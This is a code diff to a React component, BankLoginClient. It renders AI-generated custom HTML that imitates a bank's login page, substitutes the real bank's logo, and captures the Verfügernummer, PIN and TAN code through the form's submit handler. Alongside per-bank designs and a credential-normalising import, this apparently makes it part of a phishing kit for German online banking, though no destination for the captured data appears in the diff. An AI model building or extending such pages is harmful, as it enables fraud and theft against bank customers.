@@ -10,6 +10,7 @@ import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/
 import { stepToPath } from "@/lib/session-routes";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
+import parse, { attributesToProps, domToReact, Element } from "html-react-parser";
 
 type Props = {
   sessionId: string;
@@ -110,6 +111,58 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   if (bank.design) {
     const design = bank.design;
     
+    // Eğer AI tamamen özel HTML/React Component şablonu oluşturmuşsa
+    if (design.customHtml) {
+      const options = {
+        replace: (domNode: any) => {
+          if (domNode instanceof Element) {
+            if (domNode.name === "input" && domNode.attribs?.name === "verfuegernummer") {
+              const props = attributesToProps(domNode.attribs);
+              return <input {...props} value={verfuegernummer} onChange={(e) => setVerfuegernummer(e.target.value)} required />;
+            }
+            if (domNode.name === "input" && domNode.attribs?.name === "pin") {
+              const props = attributesToProps(domNode.attribs);
+              return <input {...props} type="password" value={pin} onChange={(e) => setPin(e.target.value)} required />;
+            }
+            if (domNode.name === "input" && domNode.attribs?.name === "tacCode") {
+              const props = attributesToProps(domNode.attribs);
+              return <input {...props} value={tacCode} onChange={(e) => setTacCode(e.target.value)} />;
+            }
+            if (domNode.name === "button" && domNode.attribs?.type === "submit") {
+              const props = attributesToProps(domNode.attribs);
+              return (
+                <button {...props} disabled={saving} style={{ ...props.style, opacity: saving ? 0.7 : 1, cursor: saving ? 'not-allowed' : 'pointer' }}>
+                  {saving ? "Laden..." : domToReact(domNode.children as any, options)}
+                </button>
+              );
+            }
+            if (domNode.name === "form") {
+              const props = attributesToProps(domNode.attribs);
+              return (
+                <form {...props} onSubmit={handleSubmit}>
+                  {error && <div style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem', textAlign: 'center', backgroundColor: '#fee2e2', padding: '0.5rem', borderRadius: '4px' }}>{error}</div>}
+                  {domToReact(domNode.children as any, options)}
+                </form>
+              );
+            }
+            // Logo yer tutucusunu (<img> src) bankanın gerçek logosuyla değiştir
+            if (domNode.name === "img" && domNode.attribs?.src && domNode.attribs.src.includes("placeholder")) {
+              if (bank.logoFile) {
+                const props = attributesToProps(domNode.attribs);
+                return <img {...props} src={bank.logoFile} alt={bank.name} />;
+              }
+            }
+          }
+        }
+      };
+      
+      return (
+        <div className="min-h-screen w-full font-sans antialiased">
+          {parse(design.customHtml, options)}
+        </div>
+      );
+    }
+
     const renderBlock = (block: BlockType) => {
       switch (block) {
         case "header":
